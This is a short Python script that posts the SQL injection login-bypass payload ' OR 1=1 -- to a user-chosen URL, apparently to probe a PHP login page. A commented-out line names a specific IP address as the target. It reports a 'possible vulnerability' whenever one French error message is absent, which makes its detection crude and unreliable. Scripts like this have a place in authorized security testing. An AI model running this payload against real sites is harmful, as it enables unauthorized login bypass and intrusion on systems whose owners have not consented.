import requests

url = input("Choose url: ")
# The URL of the website you want to test
"""url = "http://51.15.136.118/pageid.php" """

# The parameter you want to test for SQL injection
usr = "' OR 1=1 -- "

passwd = "whatever"

# Send the request to the website
r = requests.post(url, data={'username': usr, 'password': passwd})

# Check the response for the presence of a specific string
if "Nom d'utilisateur ou mot de passe incorrect" in r.text:
    print("No SQL injection vulnerability detected")
else:
    print("Possible SQL injection vulnerability")

